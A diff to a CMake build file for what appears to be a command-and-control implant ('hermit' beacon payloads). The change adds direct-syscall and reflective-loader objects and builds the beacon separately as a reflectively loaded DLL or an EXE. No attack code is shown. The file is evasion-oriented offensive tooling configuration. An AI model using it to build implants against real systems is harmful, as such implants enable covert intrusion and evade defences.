@@ -48,7 +48,8 @@ add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})
 
 # SOURCES
 set(SOURCE_ASM
-        ${ASM_OBJECT}
+        ${ASM_OBJ_SYSCALLS}
+        ${ASM_OBJ_REFLECTIVE}
 )
 
 set(SOURCE_CORE
@@ -115,10 +116,18 @@ set(SOURCE_CORE
 )
 
 if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
-    set(SOURCE_MAIN
-            src/hermit.cpp
-            src/main/beacon_${PAYLOAD_FORMAT}.cpp
-    )
+    if(${PAYLOAD_FORMAT} STREQUAL "dll")
+        set(SOURCE_MAIN
+                src/hermit.cpp
+                src/main/beacon_dll.cpp
+                src/main/reflective.cpp
+        )
+    elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN
+                src/hermit.cpp
+                src/main/beacon_exe.cpp
+        )
+    endif()
 # elseif(${PAYLOAD_TYPE} STREQUAL \"interactive\")
 endif()
 
